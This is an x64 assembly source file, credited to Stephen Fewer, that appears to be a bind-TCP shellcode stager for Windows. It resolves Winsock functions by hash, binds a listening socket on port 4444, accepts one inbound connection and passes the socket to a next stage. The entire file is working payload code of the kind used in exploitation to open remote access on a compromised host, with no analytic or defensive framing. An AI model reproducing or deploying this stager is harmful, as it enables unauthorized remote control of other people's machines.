;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Architecture: x64
;-----------------------------------------------------------------------------;
[BITS 64]

; Input: RBP must be the address of 'api_call'.
; Output: RDI will be the newly connected clients socket
; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15

bind_tcp:
  ; setup the structures we need on the stack...
  mov r14, 'ws2_32'
  push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
  mov r14, rsp           ; save pointer to the "ws2_32" string for LoadLibraryA call.
  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)
  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
  mov r12, 0x000000005C110002        
  push r12               ; bind to 0.0.0.0 family AF_INET and port 4444
  mov r12, rsp           ; save pointer to sockaddr_in struct for bind call
  ; perform the call to LoadLibraryA...
  mov rcx, r14           ; set the param for the library to load
  mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp               ; LoadLibraryA( "ws2_32" )
  ; perform the call to WSAStartup...
  mov rdx, r13           ; second param is a pointer to this stuct
  push 0x0101            ;
  pop rcx                ; set the param for the version requested
  mov r10d, 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
  call rbp               ; WSAStartup( 0x0101, &WSAData );
  ; perform the call to WSASocketA...
  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.
  push rax               ; push null for reserved parameter
  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
  xor r8, r8             ; we do not specify a protocol
  inc rax                ;
  mov rdx, rax           ; push SOCK_STREAM
  inc rax                ;
  mov rcx, rax           ; push AF_INET
  mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
  mov rdi, rax           ; save the socket for later
  ; perform the call to bind...
  push byte 16           ; 
  pop r8                 ; length of the sockaddr_in struct (we only set the first 8 bytes as the last 8 are unused)
  mov rdx, r12           ; set the pointer to sockaddr_in struct
  mov rcx, rdi           ; socket
  mov r10d, 0x6737DBC2   ; hash( "ws2_32.dll", "bind" )
  call rbp               ; bind( s, &sockaddr_in, 16 );
  ; perform the call to listen...
  xor rdx, rdx           ; backlog
  mov rcx, rdi           ; socket
  mov r10d, 0xFF38E9B7   ; hash( "ws2_32.dll", "listen" )
  call rbp               ; listen( s, 0 );
  ; perform the call to accept...
  xor r8, r8             ; we set length for the sockaddr struct to zero
  xor rdx, rdx           ; we dont set the optional sockaddr param
  mov rcx, rdi           ; listening socket
  mov r10d, 0xE13BEC74   ; hash( "ws2_32.dll", "accept" )
  call rbp               ; accept( s, 0, 0 );
  ; perform the call to closesocket...
  mov rcx, rdi           ; the listening socket to close
  mov rdi, rax           ; swap the new connected socket over the listening socket
  mov r10d, 0x614D6E75   ; hash( "ws2_32.dll", "closesocket" )
  call rbp               ; closesocket( s );
  ; restore RSP so we dont have any alignment issues with the next block...
  add rsp, ( (408+8) + (8*4) + (32*7) ) ; cleanup the stack allocations